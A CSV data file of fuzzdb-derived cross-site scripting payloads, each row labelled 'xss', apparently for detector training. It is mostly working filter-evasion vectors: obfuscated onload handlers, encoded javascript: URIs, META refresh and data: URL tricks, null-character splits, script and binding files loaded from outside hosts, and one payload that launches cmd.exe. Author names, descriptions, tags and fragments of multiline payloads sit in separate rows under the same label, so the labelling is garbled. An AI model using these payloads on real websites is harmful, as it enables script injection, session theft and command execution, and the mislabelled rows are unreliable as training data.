id,payload,label
fuzzdb_1248,"Exploit Tags: general, evil tags, JSON, obfuscated",xss
fuzzdb_1249,Author Name: thespanner.co.uk,xss
fuzzdb_1250,JSON based onload vector,xss
fuzzdb_1251,Exploit Name: JSON based onload vector,xss
fuzzdb_1252,Exploit String: <body onload=a1={x:this.parent.document};a1.x.writeln(1);>,xss
fuzzdb_1253,Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM,xss
fuzzdb_1254,"Exploit Tags: general, evil tags, JSON, obfuscated",xss
fuzzdb_1255,Author Name: thespanner.co.uk,xss
fuzzdb_1256,JSON based semicolon-onload vector,xss
fuzzdb_1257,Exploit Name: JSON based semicolon-onload vector,xss
fuzzdb_1258,Exploit String: <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;,xss
fuzzdb_1259,Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM. Also this vector uses semicolons to obfuscate.,xss
fuzzdb_1260,"Exploit Tags: general, evil tags, JSON, obfuscated",xss
fuzzdb_1261,Author Name: thespanner.co.uk,xss
fuzzdb_1262,LAYER,xss
fuzzdb_1263,Exploit Name: LAYER,xss
fuzzdb_1264,"Exploit String: <LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",xss
fuzzdb_1265,Exploit Description: Layer (Older Netscape only),xss
fuzzdb_1266,"Exploit Tags: general, evil tags",xss
fuzzdb_1267,Author Name: ha.ckers.org,xss
fuzzdb_1268,List-style-image,xss
fuzzdb_1269,Exploit Name: List-style-image,xss
fuzzdb_1270,"Exploit String: <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS",xss
fuzzdb_1271,Exploit Description: Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.,xss
fuzzdb_1272,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1273,Author Name: ha.ckers.org,xss
fuzzdb_1274,Livescript,xss
fuzzdb_1275,Exploit Name: Livescript,xss
fuzzdb_1276,"Exploit String: <IMG SRC=""livescript:[code]"">",xss
fuzzdb_1277,Exploit Description: Livescript (Older Netscape only),xss
fuzzdb_1278,"Exploit Tags: general, evil tags",xss
fuzzdb_1279,Author Name: ha.ckers.org,xss
fuzzdb_1280,Local .htc file,xss
fuzzdb_1281,Exploit Name: Local .htc file,xss
fuzzdb_1282,"Exploit String: <XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">",xss
fuzzdb_1283,Exploit Description: This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.,xss
fuzzdb_1284,"Exploit Tags: general, evil tags, internet explorer, injection",xss
fuzzdb_1285,Author Name: ha.ckers.org,xss
fuzzdb_1286,Long UTF-8 Unicode w/out Semicolons,xss
fuzzdb_1287,Exploit Name: Long UTF-8 Unicode w/out Semicolons,xss
fuzzdb_1288,Exploit String: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
fuzzdb_1289,"Exploit Description: Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for ”&#XX;”, since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).",xss
fuzzdb_1290,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss
fuzzdb_1291,Author Name: ha.ckers.org,xss
fuzzdb_1292,Malformed IMG Tags,xss
fuzzdb_1293,Exploit Name: Malformed IMG Tags,xss
fuzzdb_1294,"Exploit String: <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
fuzzdb_1295,"Exploit Description: Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.",xss
fuzzdb_1296,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1297,Author Name: ha.ckers.org,xss
fuzzdb_1298,Markup breaker with special quotes,xss
fuzzdb_1299,Exploit Name: Markup breaker with special quotes,xss
fuzzdb_1300,Exploit String: %26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//,xss
fuzzdb_1301,Exploit Description: This markup breaking vector utilizes specially crafted quotes to break the existing markup.,xss
fuzzdb_1302,"Exploit Tags: general, html breaking, JS breaking",xss
fuzzdb_1303,Author Name: kishor,xss
fuzzdb_1304,META,xss
fuzzdb_1305,Exploit Name: META,xss
fuzzdb_1306,"Exploit String: <META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
fuzzdb_1307,Exploit Description: The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.,xss
fuzzdb_1308,"Exploit Tags: general, evil tags",xss
fuzzdb_1309,Author Name: ha.ckers.org,xss
fuzzdb_1310,META w/additional URL parameter,xss
fuzzdb_1311,Exploit Name: META w/additional URL parameter,xss
fuzzdb_1312,"Exploit String: <META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
fuzzdb_1313,Exploit Description: Meta with additional URL parameter. If the target website attempts to see if the URL contains an ”http://” you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com),xss
fuzzdb_1314,"Exploit Tags: general, evil tags",xss
fuzzdb_1315,Author Name: ha.ckers.org,xss
fuzzdb_1316,META w/data:URL,xss
fuzzdb_1317,Exploit Name: META w/data:URL,xss
fuzzdb_1318,"Exploit String: <META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
fuzzdb_1319,"Exploit Description: This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details",xss
fuzzdb_1320,"Exploit Tags: general, evil tags",xss
fuzzdb_1321,Author Name: ha.ckers.org,xss
fuzzdb_1322,Mixed Encoding,xss
fuzzdb_1323,Exploit Name: Mixed Encoding,xss
fuzzdb_1324,"Exploit String: <A HREF=""http://6&#09;6.000146.0x7.147/"">XSS</A>",xss
fuzzdb_1325,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss
fuzzdb_1326,The tabs and newlines only work if this is encapsulated with quotes.,xss
fuzzdb_1327,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1328,Author Name: ha.ckers.org,xss
fuzzdb_1329,Mocha,xss
fuzzdb_1330,Exploit Name: Mocha,xss
fuzzdb_1331,"Exploit String: <IMG SRC=""mocha:[code]"">",xss
fuzzdb_1332,Exploit Description: Mocha (Older Netscape only),xss
fuzzdb_1333,"Exploit Tags: general, evil tags",xss
fuzzdb_1334,Author Name: ha.ckers.org,xss
fuzzdb_1335,Mozilla -moz-binding-url injection,xss
fuzzdb_1336,Exploit Name: Mozilla -moz-binding-url injection,xss
fuzzdb_1337,"Exploit String:  style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""",xss
fuzzdb_1338,Exploit Description: The vector incudes a binding file via injected style attrbute. Gecko only.,xss
fuzzdb_1339,"Exploit Tags: general, injection, gecko, style injection, XBL",xss
fuzzdb_1340,Author Name: .mario,xss
fuzzdb_1341,Mozilla -moz-binding-url injection - filter evading,xss
fuzzdb_1342,Exploit Name: Mozilla -moz-binding-url injection - filter evading,xss
fuzzdb_1343,"Exploit String:  sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a=""",xss
fuzzdb_1344,Exploit Description: This vector was once used on a major site to evade a stripping filter and inject binding XML.,xss
fuzzdb_1345,"Exploit Tags: general, injection, gecko, style injection, XBL",xss
fuzzdb_1346,Author Name: PHPIDS Group,xss
fuzzdb_1347,Multiline selfcontained XSS,xss
fuzzdb_1348,Exploit Name: Multiline selfcontained XSS,xss
fuzzdb_1349,Exploit String: _,xss
fuzzdb_1350,=,xss
fuzzdb_1351,eval,xss
fuzzdb_1352,b=1,xss
fuzzdb_1353,__,xss
fuzzdb_1354,=,xss
fuzzdb_1355,location,xss
fuzzdb_1356,c=1,xss
fuzzdb_1357,_,xss
fuzzdb_1358,(,xss
fuzzdb_1359,__,xss
fuzzdb_1360,.,xss
fuzzdb_1361,hash,xss
fuzzdb_1362,//,xss
fuzzdb_1363,.,xss
fuzzdb_1364,substr,xss
fuzzdb_1365,(1),xss
fuzzdb_1366,),xss
fuzzdb_1367,Exploit Description: This vector uses line breaks to obfuscate and evaluates the location hash.,xss
fuzzdb_1368,"Exploit Tags: self contained, general, obfuscated",xss
fuzzdb_1369,Author Name: .mario,xss
fuzzdb_1370,Multiline w/Carriage Returns,xss
fuzzdb_1371,Exploit Name: Multiline w/Carriage Returns,xss
fuzzdb_1372,"Exploit String: <IMGSRC=""javascript:alert('XSS')"">",xss
fuzzdb_1373,Exploit Description: Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).,xss
fuzzdb_1374,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1375,Author Name: ha.ckers.org,xss
fuzzdb_1376,Name contained XSS variant 1,xss
fuzzdb_1377,Exploit Name: Name contained XSS variant 1,xss
fuzzdb_1378,"Exploit String: b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name",xss
fuzzdb_1379,Exploit Description: This vector depends on attackers ability to access the window.name property where the payload is located.,xss
fuzzdb_1380,"Exploit Tags: general, name contained, obfuscated",xss
fuzzdb_1381,Author Name: PHPIDS Group,xss
fuzzdb_1382,Name contained XSS variant 2,xss
fuzzdb_1383,Exploit Name: Name contained XSS variant 2,xss
fuzzdb_1384,Exploit String: a=/ev///,xss
fuzzdb_1385,.source a+=/al///,xss
fuzzdb_1386,.source a[a] (name),xss
fuzzdb_1387,Exploit Description: This name contained XSS requires newlines to be able to work - and access to the window.name property.,xss
fuzzdb_1388,"Exploit Tags: general, name contained, obfuscated",xss
fuzzdb_1389,Author Name: .mario,xss
fuzzdb_1390,Name contained XSS variant 3,xss
fuzzdb_1391,Exploit Name: Name contained XSS variant 3,xss
fuzzdb_1392,Exploit String: a=/ev/,xss
fuzzdb_1393,.source a+=/al/,xss
fuzzdb_1394,".source,a = a[a] a(name)",xss
fuzzdb_1395,Exploit Description: New-lined requiring name contained vector - this time not comment obfuscated so easier to detect.,xss
fuzzdb_1396,"Exploit Tags: general, name contained",xss
fuzzdb_1397,Author Name: PHPIDS Group,xss
fuzzdb_1398,Name contained XSS variant 4,xss
fuzzdb_1399,Exploit Name: Name contained XSS variant 4,xss
fuzzdb_1400,Exploit String: setTimeout//,xss
fuzzdb_1401,"(name// ,0)",xss
fuzzdb_1402,Exploit Description: This vector utilizes the setTimeout function to fire - also it's name contained and comment-obfuscated and requires newlines.,xss
fuzzdb_1403,"Exploit Tags: general, name contained, obfuscated, timed",xss
fuzzdb_1404,Author Name: PHPIDS Group,xss
fuzzdb_1405,navigatorurl: code execution,xss
fuzzdb_1406,Exploit Name: navigatorurl: code execution,xss
fuzzdb_1407,"Exploit String: navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",xss
fuzzdb_1408,Exploit Description: This navigatorurl-uri executes the cmd.exe on vulnerable systems.,xss
fuzzdb_1409,"Exploit Tags: URI exploits, gecko, injection, general",xss
fuzzdb_1410,Author Name: xs-sniper,xss
fuzzdb_1411,No Closing Script Tag,xss
fuzzdb_1412,Exploit Name: No Closing Script Tag,xss
fuzzdb_1413,Exploit String: <SCRIPT SRC=http://ha.ckers.org/xss.js,xss
fuzzdb_1414,"Exploit Description: In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the ”></SCRIPT>” portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.",xss
fuzzdb_1415,"Exploit Tags: general, evil tags, injection, gecko",xss
fuzzdb_1416,Author Name: ha.ckers.org,xss
fuzzdb_1417,No Quotes/Semicolons,xss
fuzzdb_1418,Exploit Name: No Quotes/Semicolons,xss
fuzzdb_1419,Exploit String: <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,xss
fuzzdb_1420,Exploit Description: No single quotes or double quotes or semicolons.,xss
fuzzdb_1421,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1422,Author Name: ha.ckers.org,xss
fuzzdb_1423,Non-Alpha/Non-Digit,xss
fuzzdb_1424,Exploit Name: Non-Alpha/Non-Digit,xss
fuzzdb_1425,"Exploit String: <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_1426,Exploit Description: Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”<SCRIPT\s” != ”<SCRIPT/XSS\s”,xss
fuzzdb_1427,"Exploit Tags: general, evil tags, injection",xss
fuzzdb_1428,Author Name: ha.ckers.org,xss
fuzzdb_1429,Non-Alpha/Non-Digit Part 2,xss
fuzzdb_1430,Exploit Name: Non-Alpha/Non-Digit Part 2,xss
fuzzdb_1431,"Exploit String: <BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(""XSS"")>",xss
fuzzdb_1432,"Exploit Description: Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.",xss
fuzzdb_1433,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1434,Author Name: ha.ckers.org,xss
fuzzdb_1435,Noscript-breaker with mouseover,xss
fuzzdb_1436,Exploit Name: Noscript-breaker with mouseover,xss
fuzzdb_1437,Exploit String: </noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>,xss
fuzzdb_1438,Exploit Description: This vector breaks noscript areas and appends an element reacting on mouseover events.,xss
fuzzdb_1439,"Exploit Tags: general, html breaking, obfuscated, user interaction",xss
fuzzdb_1440,Author Name: kishor,xss
fuzzdb_1441,Null Chars 1,xss
fuzzdb_1442,Exploit Name: Null Chars 1,xss
fuzzdb_1443,"Exploit String: perl -e 'print ""<IMG SRC=java\0script:alert(""XSS"")>"";'> out",xss
fuzzdb_1444,"Exploit Description: Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.",xss
fuzzdb_1445,"Exploit Tags: general, evil tags, obfuscated, internet explorer, CRLF",xss
fuzzdb_1446,Author Name: ha.ckers.org,xss
fuzzdb_1447,Null Chars 2,xss
fuzzdb_1448,Exploit Name: Null Chars 2,xss
fuzzdb_1449,"Exploit String: perl -e 'print ""&<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out",xss
fuzzdb_1450,Exploit Description: Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date,xss
fuzzdb_1451,"Exploit Tags: general, evil tags, obfuscated, CRLF",xss
fuzzdb_1452,Author Name: ha.ckers.org,xss
fuzzdb_1453,Obfuscated body onload vector,xss
fuzzdb_1454,Exploit Name: Obfuscated body onload vector,xss
fuzzdb_1455,Exploit String: <body onload=;;;;;;;;;;;_=alert;_(1);;;;,xss
fuzzdb_1456,Exploit Description: This vector creates a new body tag and utilizes semicolons and underscores to evade filters and produce an alert.,xss
fuzzdb_1457,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1458,Author Name: thespanner.co.uk,xss
fuzzdb_1459,Obfuscated DOM element creation,xss
fuzzdb_1460,Exploit Name: Obfuscated DOM element creation,xss
fuzzdb_1461,Exploit String: s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=,xss
fuzzdb_1462,0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=,xss
fuzzdb_1463,0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa,xss
fuzzdb_1464,rentNode;x.appendChild(i);,xss
fuzzdb_1465,Exploit Description: This vector utilizes ternary operators to obfuscate JavaScript code which creates new DOM elements.,xss
fuzzdb_1466,"Exploit Tags: general, obfuscated, injection",xss
fuzzdb_1467,Author Name: thespanner.co.uk,xss
fuzzdb_1468,Obfuscated double-body onload vector,xss
fuzzdb_1469,Exploit Name: Obfuscated double-body onload vector,xss
fuzzdb_1470,Exploit String: <body <body onload=;;;;;al:eval('al'+'ert(1)');;>,xss
fuzzdb_1471,Exploit Description: This vector creates a doubled new body tag and utilizes semicolons to evade filters and produce an alert.,xss
